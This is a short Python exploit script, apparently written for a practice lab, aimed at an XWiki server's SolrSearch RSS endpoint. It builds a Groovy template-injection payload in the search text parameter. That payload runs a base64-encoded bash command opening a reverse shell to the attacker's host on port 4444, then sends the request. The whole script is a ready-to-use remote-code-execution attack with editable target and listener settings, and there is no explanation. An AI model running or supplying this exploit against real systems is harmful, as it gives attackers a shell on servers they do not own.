import requests
from urllib.parse import quote

target = "10.129.212.160:8080"  # 수정 가능
lhost = "10.10.14.72"
lport = "4444"

# base64 bash payload
bash_b64 = 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43Mi80NDQ0IDA+JjE='
payload = f'''}}}}{{async async=false}}{{{{groovy}}}}'bash -c {{echo,{bash_b64}}}|{{base64,-d}}|{{bash,-i}}'.execute(){{{{/groovy}}}}{{{{/async}}}}'''

exploit_url = f"http://{target}/xwiki/bin/get/Main/SolrSearch?media=rss&text={quote(payload)}"

print("[+] Sending payload:")
print(exploit_url)

r = requests.get(exploit_url)
print(f"[✓] Status: {r.status_code}")
